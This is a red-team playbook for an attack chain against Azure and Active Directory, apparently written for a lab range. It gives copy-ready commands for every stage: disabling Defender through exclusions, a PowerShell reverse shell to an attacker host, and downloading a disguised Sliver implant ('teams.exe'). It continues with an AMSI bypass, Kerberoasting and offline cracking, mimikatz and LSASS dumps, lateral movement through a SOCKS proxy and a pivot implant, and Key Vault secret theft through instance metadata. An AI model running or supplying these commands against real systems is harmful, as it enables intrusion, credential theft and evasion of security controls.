# Azure RunCommand + Sliver C2 — Proven Attack Path

Engagement-proven chain. Every command validated live. NO `--evasion` flag (causes AMSI alerts). Follow in order.

## Quick Reference (Speed Run)

```bash
# 1. Auth (SP cert)
Connect-AzAccount -ServicePrincipal -Tenant $TenantId -ApplicationId $AppId -CertificatePath $PfxPath -CertificatePassword $PfxPass

# 2. Defender exclusions FIRST (via RunCommand — before nc shell)
$exc = 'Add-MpPreference -ExclusionPath "C:\"; Add-MpPreference -ExclusionProcess "*"; Add-MpPreference -ExclusionExtension "exe"; Add-MpPreference -ExclusionProcess "powershell.exe"'
Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" -CommandId "RunPowerShellScript" -ScriptString $exc
# WAIT for completion, then:

# 3. NC reverse shell on httpserver
nc -lvnp 80
$script = '$s=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(''$c=New-Object System.Net.Sockets.TCPClient("YOUR_KALI_IP",80);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+"PS "+(gl).Path+"> ");$s.Write($sb,0,$sb.Length);$s.Flush()}'')); powershell -nop -w hidden -ep bypass -enc $s'
Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" -CommandId "RunPowerShellScript" -ScriptString $script -AsJob

# 4. Drop Sliver (from nc shell)
iwr http://YOUR_KALI_IP:8080/teams.exe -OutFile C:\ProgramData\teams.exe -UseBasicParsing
Start-Process C:\ProgramData\teams.exe -WindowStyle Hidden

# 5. Kerberoast (from Sliver session)
rubeus -- kerberoast /format:hashcat /nowrap

# 6. Lateral move
# In Sliver: socks5 start -p 1080
proxychains evil-winrm -i 10.1.0.100 -u 'contoso\svc.mssql' -p 'CRACKED_PASSWORD'
```

---

## Full Chain

```
Kali: Build Sliver, start listener, generate Harriet-wrapped implant
  |
  v
RunCommand -> NC reverse shell on httpserver (SYSTEM)
  |
  v
Disable Defender + AMSI + ScriptBlock logging
  |
  v
Download + execute Sliver implant -> beacon checks in
  |
  v
Domain enum -> Kerberoast svc.mssql -> crack offline
  |
  v
SOCKS5 proxy -> evil-winrm to blueDBServer
  |
  v
SQL Server access, credential dump, DC takeover
```

### Environment

| Asset | IP |
|-------|-----|
| httpserver | blueHttpServer / 10.1.0.10 |
| DBServer | blueDBServer / 10.1.0.100 |
| Domain Controller | blueDC-01 / blueDomainServer / 10.1.0.5 |
| EntraConnect | blueEntraC-01 / 10.1.0.25 |
| FileServer | blueFileServer / 10.1.0.20 |
| Domain | contoso.range |
| Resource Group | RGCORPSERVERS |

---

## Step 0: Prerequisites

```bash
# Az CLI
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# Ruby + gem (required for evil-winrm)
sudo apt install -y ruby ruby-dev build-essential

# evil-winrm
gem install evil-winrm

# Az PowerShell module
pwsh -c "Install-Module -Name Az -Repository PSGallery -Force -Scope CurrentUser"
```

---

## Step 1: Kali Setup

### 1a: Build Sliver

```bash
git clone https://github.com/mgstate/sliver.git ~/sliver
cd ~/sliver
bash setup.sh
```

Installs Go, MinGW, Harriet, builds Sliver, downloads tools, creates helper scripts.

### 1b: Start Server + Listener

```bash
cd ~/sliver
./start.sh
```

### 1c: Armory — Install Everything

Inside Sliver console:

```
armory install all
```

This installs ALL extensions/aliases: nanodump, mimikatz, rubeus, credman, sharpsecdump, sharpdpapi, sharpchrome, seatbelt, sharpview, sharpup, sharp-hound-4, certify, sqlrecon, inject-amsi-bypass, inject-etw-bypass, unhook-bof, all 52+ sa-* BOFs, all lateral movement tools, and more.

---

## Step 2: Generate Harriet-Wrapped Implant

**IMPORTANT: Do NOT use `--evasion` flag. It triggers AMSI alerts.**

```bash
# Generate beacon shellcode (NO --evasion)
generate beacon --mtls YOUR_KALI_IP:8888 --os windows --arch amd64 \
  --format shellcode --c2profile microsoft365 \
  --seconds 60 --jitter 30 --strategy r --save /tmp/beacon.bin

# Wrap with Harriet (AES-encrypted, direct syscalls)
harriet --shellcode /tmp/beacon.bin --method directsyscall \
  --format exe --output /tmp/teams.exe \
  --harriet-path /opt/Home-Grown-Red-Team/Harriet
```

### Manual Harriet (if `harriet` command not available)

```bash
cd /opt/Home-Grown-Red-Team/Harriet
printf "/tmp/beacon.bin\n/tmp/teams.exe\n" | bash Harriet/DirectSyscalls/DirectSyscalls.sh
```

### Host the implant

```bash
cd /tmp && python3 -m http.server 8080
```

---

## Step 3: Authenticate

### 3a: Find Tenant ID and Client ID from PFX

The PFX cert file you downloaded contains the SP info. Extract it:

```bash
# Read the PFX cert subject/issuer to find the App Name
openssl pkcs12 -in AzureAppCert.pfx -nokeys -clcerts 2>/dev/null | openssl x509 -subject -issuer -noout

# The cert filename often contains a thumbprint (e.g., AzureAppCert_5b03c63c39874fa8ace73afd6a9c9877.cer)
# The .cer file next to the PFX has the same info
```

**From Meatball / GraphSpy UI:**
- Go to **Tokens** page → find the SP token you used to download the cert
- The token shows `tenant_id` and `client_id` (Application ID)
- Or check **Recon > Applications** to see all SP registrations

**From Azure Portal (if you have access):**
- App Registrations → find the app → copy Application (client) ID
- Overview → Directory (tenant) ID

### 3b: SP Certificate Auth (Proven)

```bash
# cd to where you downloaded the PFX
cd ~/Downloads   # or wherever your PFX is
```

```powershell
# Set your values (found from step 3a)
$TenantId = "YOUR_TENANT_ID"       # e.g., "527c0d4b-2722-4f04-b9ed-7b13ed039ecb"
$AppId = "YOUR_APP_ID"             # e.g., "9d1e53c7-28f6-4d1d-8d8a-1abeb4db2888"
$PfxPath = "./AzureAppCert.pfx"    # path to your PFX file
$PfxPass = ConvertTo-SecureString -String "" -AsPlainText -Force  # empty if no password

Connect-AzAccount -ServicePrincipal -Tenant $TenantId -ApplicationId $AppId `
  -CertificatePath $PfxPath -CertificatePassword $PfxPass

# Verify
Get-AzContext | Format-List Name, Tenant, Subscription
```

### 3c: SP Secret Auth (Alternative)

```powershell
$cred = New-Object PSCredential("CLIENT_ID", (ConvertTo-SecureString "SECRET" -AsPlainText -Force))
Connect-AzAccount -ServicePrincipal -Credential $cred -TenantId "TENANT_ID"
```

### 3d: Set Subscription + Verify VMs

```powershell
# List available subscriptions
Get-AzSubscription | Format-Table Name, Id, State

# Set the target subscription
Set-AzContext -SubscriptionId "SUBSCRIPTION_ID"

# Verify you can see VMs
Get-AzVM -ResourceGroupName "RGCORPSERVERS" | Format-Table Name, Location
```

---

## Step 4: Get a Shell via RunCommand

**IMPORTANT: Defender is managed by policy (can't disable) but exclusions work. The nc reverse shell gets flagged as `PUA:PowerShell/ReverseShell` if exclusions aren't set first. Always run exclusions via RunCommand BEFORE the nc shell.**

### 4a: Set Defender Exclusions FIRST (via RunCommand — no shell needed)

```powershell
$exc = 'Add-MpPreference -ExclusionPath "C:\"; Add-MpPreference -ExclusionProcess "*"; Add-MpPreference -ExclusionExtension "exe"; Add-MpPreference -ExclusionProcess "powershell.exe"'

Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
  -CommandId "RunPowerShellScript" -ScriptString $exc
```

**Wait for this to complete before proceeding.** Registry-based disables (DisableScriptScanning, AMSI provider removal) are overridden by managed Defender — only `Add-MpPreference` exclusions work.

### 4b: Start NC Listener

```bash
nc -lvnp 80
```

### 4c: Deploy Reverse Shell (after exclusions are set)

```powershell
$script = '$s=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(''$c=New-Object System.Net.Sockets.TCPClient("YOUR_KALI_IP",80);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+"PS "+(gl).Path+"> ");$s.Write($sb,0,$sb.Length);$s.Flush()}'')); powershell -nop -w hidden -ep bypass -enc $s'

Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
  -CommandId "RunPowerShellScript" -ScriptString $script -AsJob
```

You now have a SYSTEM shell on httpserver.

### 4d: Drop Sliver Implant (From NC Shell)

```powershell
iwr http://YOUR_KALI_IP:8080/teams.exe -OutFile C:\ProgramData\teams.exe -UseBasicParsing
Start-Process C:\ProgramData\teams.exe -WindowStyle Hidden
```

### 4e: All-in-One via RunCommand (No NC Shell)

```powershell
# Step 1: Exclusions (run FIRST, wait for completion)
$exc = 'Add-MpPreference -ExclusionPath "C:\"; Add-MpPreference -ExclusionProcess "*"; Add-MpPreference -ExclusionExtension "exe"; Add-MpPreference -ExclusionProcess "powershell.exe"'

Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
  -CommandId "RunPowerShellScript" -ScriptString $exc

# WAIT for completion, THEN:

# Step 2: Download + execute implant
$drop = 'iwr http://YOUR_KALI_IP:8080/teams.exe -OutFile C:\ProgramData\teams.exe -UseBasicParsing; Start-Process C:\ProgramData\teams.exe -WindowStyle Hidden'

Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
  -CommandId "RunPowerShellScript" -ScriptString $drop -AsJob
```

---

## Step 5: Verify Beacon

```
beacons
use <BEACON_ID>
interactive
```

---

## Step 6: Domain Enumeration

```
# AMSI + ETW bypass (run first every time)
inject-amsi-bypass
inject-etw-bypass

# Situational awareness
sa-whoami
getprivs
sa-ipconfig
sa-arp
sa-netstat

# Domain info
execute -o "nltest /dclist:contoso.range"
execute -o "nltest /domain_trusts"

# Domain users
sa-ldapsearch "(objectClass=user)" sAMAccountName,memberOf

# Domain Admins
sa-netgroup "Domain Admins" /domain

# Local admins
sa-netlocalgroup Administrators

# Computers
sa-ldapsearch "(objectClass=computer)" cn,dNSHostName,operatingSystem

# SPNs (kerberoast targets)
sa-ldapsearch "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName,servicePrincipalName

# AV/EDR check
sa-driversigs
sa-enum-filter-driver
```

### Port Scan

```
portscan --host 10.1.0.100 --ports 445,5985,3389,1433,135
portscan --host 10.1.0.5 --ports 445,5985,3389,88,389
portscan --host 10.1.0.25 --ports 445,5985,3389
portscan --host 10.1.0.20 --ports 445,5985,3389
```

---

## Step 7: Kerberoast

```
# Rubeus (proven, .NET in-process)
rubeus -- kerberoast /format:hashcat /nowrap
```

Copy the `$krb5tgs$23$*...` hash.

---

## Step 8: Crack Offline

```bash
echo '$krb5tgs$23$*svc.mssql$contoso.range$...' > hash.txt
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## Step 9: Credential Dump

```
# mimikatz (in-process via armory)
mimikatz sekurlsa::logonpasswords
mimikatz lsadump::sam
mimikatz lsadump::secrets

# nanodump (LSASS via syscalls)
nanodump -- --write C:\Windows\Temp\debug.dmp --valid
download C:\Windows\Temp\debug.dmp
# On Kali: pypykatz lsa minidump debug.dmp

# sharpsecdump (no files on disk)
sharpsecdump -- -target=localhost

# hashdump (built-in)
hashdump
```

### execute-assembly with Local Tools

For tools NOT in the armory, use `execute-assembly` with local .exe files from `~/sliver/tools/`:

```
# LSA Whisperer — works even with Credential Guard enabled
# Uses LsaCallAuthenticationPackage (never opens LSASS handle)
execute-assembly --in-process ~/sliver/tools/lsa-whisperer/build/lsa-whisperer.exe credkey
execute-assembly --in-process ~/sliver/tools/lsa-whisperer/build/lsa-whisperer.exe ntlmv1
execute-assembly --in-process ~/sliver/tools/lsa-whisperer/build/lsa-whisperer.exe klist
execute-assembly --in-process ~/sliver/tools/lsa-whisperer/build/lsa-whisperer.exe dump
execute-assembly --in-process ~/sliver/tools/lsa-whisperer/build/lsa-whisperer.exe ssocookie

# Seatbelt — full host recon
execute-assembly --in-process ~/sliver/tools/sharp-tools/Seatbelt.exe -group=all

# SharpUp — privesc checks
execute-assembly --in-process ~/sliver/tools/sharp-tools/SharpUp.exe audit

# Certify — AD CS enumeration
execute-assembly --in-process ~/sliver/tools/sharp-tools/Certify.exe find /vulnerable

# SharpDPAPI — DPAPI credential blobs
execute-assembly --in-process ~/sliver/tools/sharp-tools/SharpDPAPI.exe triage
execute-assembly --in-process ~/sliver/tools/sharp-tools/SharpDPAPI.exe machinecredentials

# Rubeus (local copy — same as armory but always available)
execute-assembly --in-process ~/sliver/tools/sharp-tools/Rubeus.exe kerberoast /format:hashcat /nowrap
execute-assembly --in-process ~/sliver/tools/sharp-tools/Rubeus.exe triage
```

### Tool Paths (after setup.sh)

```
~/sliver/tools/
├── lsa-whisperer/build/     # LSA Whisperer exe (Credential Guard bypass)
├── lsawhisper-bof/          # LSA Whisperer BOF variant
├── No-Consolation/          # In-memory PE loader
└── sharp-tools/             # Pre-compiled .NET
    ├── Rubeus.exe
    ├── Seatbelt.exe
    ├── SharpUp.exe
    ├── Certify.exe
    └── SharpDPAPI.exe
```

---

## Step 10: Lateral Movement — evil-winrm via SOCKS Proxy

### 10a: Start SOCKS5 Proxy

From Sliver session on httpserver:
```
socks5 start -p 1080
```

### 10b: evil-winrm to DBServer (Proven)

From Kali:
```bash
proxychains evil-winrm -i 10.1.0.100 -u 'contoso\svc.mssql' -p 'CRACKED_PASSWORD'
```

### 10c: Invoke-Command Alternative

From Sliver session:
```
execute -o powershell -c "Invoke-Command -ComputerName blueDBServer -Credential (New-Object PSCredential('contoso\svc.mssql',(ConvertTo-SecureString 'CRACKED_PASSWORD' -AsPlainText -Force))) -ScriptBlock {whoami; hostname; Get-Service *SQL*}"
```

### 10d: TCP Pivot Implant

```
generate --tcp-pivot 10.1.0.10:8888 --os windows --arch amd64 --skip-symbols --name db-pivot --save /tmp/db-pivot.exe
pivots tcp --bind 0.0.0.0:8888
upload /tmp/db-pivot.exe C:\Windows\Temp\db-pivot.exe
execute -o powershell -c "$cred=New-Object PSCredential('contoso\svc.mssql',(ConvertTo-SecureString 'CRACKED_PASSWORD' -AsPlainText -Force));$b=[IO.File]::ReadAllBytes('C:\Windows\Temp\db-pivot.exe');Invoke-Command -ComputerName blueDBServer -Credential $cred -ScriptBlock {param($b)[IO.File]::WriteAllBytes('C:\Windows\Temp\svc-update.exe',$b);Start-Process 'C:\Windows\Temp\svc-update.exe'} -ArgumentList (,$b)"
```

---

## Step 11: Post-Exploitation on DBServer

From evil-winrm or Sliver session:

```powershell
# SQL databases
$c = New-Object System.Data.SqlClient.SqlConnection
$c.ConnectionString = 'Server=localhost;Integrated Security=True'
$c.Open()
$cmd = $c.CreateCommand(); $cmd.CommandText = 'SELECT name FROM sys.databases'
$rd = $cmd.ExecuteReader(); while($rd.Read()) { $rd[0] }; $rd.Close()

# sysadmin check
$cmd2 = $c.CreateCommand(); $cmd2.CommandText = "SELECT IS_SRVROLEMEMBER('sysadmin')"
$cmd2.ExecuteScalar()

# Linked servers
$cmd3 = $c.CreateCommand(); $cmd3.CommandText = 'SELECT name, data_source FROM sys.servers WHERE is_linked=1'
$rd3 = $cmd3.ExecuteReader(); while($rd3.Read()) { "$($rd3[0]) -> $($rd3[1])" }; $rd3.Close()
$c.Close()

# Local admins
net localgroup administrators

# Cred dump
mimikatz sekurlsa::logonpasswords
hashdump
```

---

## Step 12: DC Takeover via RunCommand

```powershell
$adScript = @"
Import-Module ActiveDirectory
Get-ADUser -Filter * -Properties MemberOf,ServicePrincipalName | Select Name,SamAccountName,Enabled,ServicePrincipalName | FT -Auto
Get-ADGroupMember 'Domain Admins' | Select SamAccountName
Get-ADComputer -Filter * -Properties IPv4Address | Select Name,IPv4Address | FT
"@

Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueDomainServer" `
  -CommandId "RunPowerShellScript" -ScriptString $adScript
```

---

## Troubleshooting

### Implant blocked by Defender
1. Run ALL Defender exclusions from Step 4c FIRST
2. Do NOT use `--evasion` flag — it triggers AMSI
3. Use Harriet wrapping (DirectSyscalls) for AES encryption + syscall execution
4. Try different Harriet method: `queueapc`, `nativeapi`, `fullaes`

### AMSI blocks PowerShell
```powershell
reg delete "HKLM\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" /f
```

### RunCommand queue stuck (max 25 per VM)
```powershell
Get-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" | FT Name, ProvisioningState
Remove-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" -RunCommandName "old-command"
```

### VM Agent Not Ready
```powershell
Restart-AzVM -ResourceGroupName "RGCORPSERVERS" -Name "blueHttpServer"
```

### svc.mssql password differs per environment
Each environment has a DIFFERENT password. Kerberoast in each one. Check KeyVault from inside VNet:
```powershell
$kvt = (Invoke-RestMethod -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net' -Headers @{Metadata='true'}).access_token
(Invoke-RestMethod -Uri "https://VAULT_NAME.vault.azure.net/secrets?api-version=7.4" -Headers @{Authorization="Bearer $kvt"}).value
```
